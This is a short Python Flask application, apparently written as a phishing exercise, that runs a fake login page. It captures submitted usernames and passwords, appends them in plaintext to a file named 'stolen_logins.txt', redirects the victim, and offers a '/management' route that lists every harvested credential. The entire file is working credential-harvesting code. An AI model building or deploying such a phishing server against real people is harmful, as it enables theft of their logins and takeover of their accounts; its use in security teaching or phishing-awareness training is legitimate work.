from flask import Flask, request, redirect, render_template

app = Flask(__name__)

@app.route("/", methods=["GET", "POST"])
def phishing_page():
    if request.method == "POST":
        username = request.form["username"]
        password = request.form["password"]

        with open("stolen_logins.txt", "a") as file:
            file.write(f"Username: {username}, Password: {password}\n")
            
        return redirect("http://127.0.0.1:8080/", code=302) 

    return render_template('q5.html')
    ##return

@app.route('/management')
def management():
    with open('stolen_logins.txt', 'r') as f:
        content = f.read().splitlines()
        return render_template("management.html", content = content)
    

if __name__ == "__main__":
    app.run()